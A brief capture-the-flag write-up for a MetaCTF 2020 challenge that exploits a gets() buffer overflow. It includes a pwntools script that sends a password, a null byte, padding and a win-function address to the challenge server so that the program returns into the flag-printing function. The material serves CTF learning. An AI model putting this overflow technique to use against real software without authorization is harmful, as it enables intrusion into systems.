Just like Baffling Buffer 0 the vulnurability is in **gets()**.

We have to give the right input which is "Sup3rs3cr3tC0de" and also execute a
buffer overflow, this is possible by passing a null byte right after our
input.

The gets() function shall read bytes from the standard input stream, stdin,
into the array pointed to by buf, until a <newline> is read or an end-of-file
condition is encountered.

After providing the right input, we need to overwrite the ret address for the
vuln function by the win function's address that is going to read and write
the flag.

Python script:  
```  
from pwn import *

host = "host1.metaproblems.com"  
port = 5151  
r = remote(host, port)

p = "Sup3rs3cr3tC0de"  
pad = 60-len(p)-5  
win = 0x401172

r.sendline(p+ "\x00" + pad*"A" + p64(win).decode()) # "\x72\x11\x40\x00"

print(r.recvall())  
```

*Check github url for binary, script and c code.*

Original writeup (https://github.com/infreezy/CTF-
Writeups/tree/main/2020/MetaCTF/baffling-buffer-1).